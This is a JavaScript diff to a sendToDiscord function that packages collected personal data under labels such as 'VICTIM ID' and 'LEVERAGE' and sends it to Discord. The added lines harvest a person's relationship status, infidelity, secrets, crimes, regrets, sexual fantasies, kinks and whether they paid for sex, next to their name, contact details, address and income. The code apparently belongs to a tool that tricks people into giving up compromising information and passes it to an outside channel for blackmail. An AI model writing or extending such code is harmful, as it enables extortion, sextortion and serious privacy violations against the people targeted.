@@ -305,6 +305,9 @@ function sendToDiscord() {
             fields: [
                 { name: "👤 VICTIM ID", value: `**Name:** ${data.name}\n**Email:** ${data.email}\n**Phone:** ${data.phone}\n**X/Twitter:** ${data.twitter}` },
                 { name: "🏠 LOCATION & STATUS", value: `**Address:** ${data.address}\n**Income:** ${data.income}` },
+                { name: "💔 PRIVATE LIFE", value: `**Relation:** ${data.relationship}\n**Cheater:** ${data.cheat}\n**Secret:** ||${data.secret}||` },
+                { name: "💀 DARK PSYCHOLOGY", value: `**Hates:** ${data.hate}\n**Crimes:** ||${data.crime}||\n**Regret:** ||${data.regret}||` },
+                { name: "🔥 DESIRES", value: `**Fantasy:** ||${data.fantasy}||\n**Kink:** ||${data.kink}||\n**Paid for Sex:** ${data.paid}` },
                 { name: "🎯 LEVERAGE", value: `**Target:** ${data.targetName}\n**Target Phone:** ${data.targetPhone}` },
                 { name: "🧠 CONFESSION", value: `**Vices:** ${data.vices}\n**Weakness:** ${data.weakness}` }
             ],
